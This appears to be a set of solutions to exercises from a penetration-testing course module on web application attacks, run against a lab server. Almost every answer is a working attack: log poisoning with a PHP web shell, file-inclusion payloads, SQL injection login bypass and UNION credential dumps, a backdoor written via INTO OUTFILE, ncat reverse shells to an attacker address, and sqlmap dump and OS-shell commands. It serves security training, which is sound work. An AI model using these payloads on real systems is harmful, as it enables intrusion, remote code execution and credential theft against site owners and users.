= Solutions to exercises from Module 9: Web App Attacks

== 9.4.1.3

2. `INSERT INTO webappdb.users(username, password) VALUES('me', 'm2')`

== 9.4.2.6

2. The XSS vulnerability could be used to run a script on every machine that loads the site, for cryptomining. If the website allowed payments, scripts could be injected to read credit card data as it is input to the site.
3. The exploit attacks the clients of the site, since it requires the client to load the site to expose their session cookie.

== 9.4.4.5

2. We poison the logs with the line `<?php echo '<pre>' . shell_exec(base64_decode($_GET['cmd'])) . '</pre>';?>`
Then, to get a shell, we just submit the string of the output of the command `echo -n "ncat 192.168.119.224 4444 -e cmd.exe" | base64` as the `cmd` parameter

== 9.4.4.7

1. We use the same technique mentioned above, by exposing a file containing the above on a python HTTP server. 
2. The only difference here is to name the exposed file `current_menu.php`.
3. We start by getting the reverse shell script and renaming it `cp /usr/share/webshells/php/php_reverse_shell.php current_menu.php`.
Then, we replace the IP address, the port number, and the shell command to `cmd`, and start a python HTTP server.
Finally, we reload the URL with the remote path as the `file` parameter, and the script connects to our listener.

== 9.4.4.10

1. We use a data wrapper to retrieve the `ipconfig` of the server using
`http://192.168.224.10/menu.php?file=data:text/plain,%3C?php%20echo%20%27%3Cpre%3E%27%20.%20shell_exec($_GET[%27cmd%27])%20.%20%27%3C/pre%3E%27;?%3E&cmd=ipconfig`
2. We use the above to supply a cmd that opens a reverse shell back to our machine, using
`http://192.168.224.10/menu.php?file=data:text/plain,%3C?php%20echo%20%27%3Cpre%3E%27%20.%20shell_exec($_GET[%27cmd%27])%20.%20%27%3C/pre%3E%27;?%3E&cmd=ncat%20192.168.119.224%204444%20-e%20cmd.exe`

== 9.4.5.4

1. Using the `root/root` username/password pair we recovered earlier, we login into the phpmyadmin interface. There, we can run SQL query that results into a true value, like:

image::module_9/sql_inject_query.png[]

2. By using the input `tom' or 1=1 limit 1;#`, we force the SQL query to resolve to true, which allows us to login
3. Looking at the source code of the page (under `c:/xampp/htdocs/admin.php`), the application seems to read the value input into the username field, and set it to the `$_SESSION['user']` field, which is reused in that header.
4. We use the value `tom` for the username, and `' or 1=1 limit 1;#` for the password. Setting the limit to 1 is necessary because the web app needs an exact match of 1 to treat the query as a true value.

== 9.4.5.9

1. Using `debug.php?id=1 ORDER BY 4` returns an error, suggesting that there are only 3 columns in the database. We then use `debug.php?id=1 UNION SELECT 1, 2, table_name from information_schema.tables` to enumerate the list of tables
2. This is because the list of results is returned as a SQL cursor, and they simply iterate through every single row in that cursor, displaying the results directly into the HTML without escaping it.
3. We use `debug.php?id=1 UNION SELECT 1, username, password from users` to get the list of usernames and passwords.

== 9.4.5.11

1. First, we start by creating the backdoor file, using the URL `debug.php?id=1 union SELECT 1,2, "<?php echo shell_exec($_GET['cmd']);?>" into OUTFILE 'c:/xampp/htdocs/backdoor.php'`
This allows us to pass any command we want.
2. Then, we simply  use the URL `backdoor.php?cmd=ncat%20192.168.119.224%204444%20-e%20cmd.exe` which opens a reverse shell with a local listener.

== 9.4.5.13

1. `sqlmap -u http://192.168.224.10/debug.php?id=1 -p "id" --dbms=mysql --dump` gives

```
Database: webappdb
Table: feedback
[2 entries]
+----+----------------------------------------------+------+
| id | text                                         | name |
+----+----------------------------------------------+------+
| 1  | Great tacos today!                           | Jake |
| 2  | I would eat tacos here every day if I could! | John |
+----+----------------------------------------------+------+
```

And 

```
Database: webappdb
Table: users
[2 entries]
+----+----------+--------------+
| id | username | password     |
+----+----------+--------------+
| 1  | admin    | p@ssw0rd     |
| 2  | jigsaw   | footworklure |
+----+----------+--------------+
```

2. `sqlmap -u http://192.168.224.10/debug.php?id=1 -p "id" --dbms=mysql --os-shell` gives us a shell
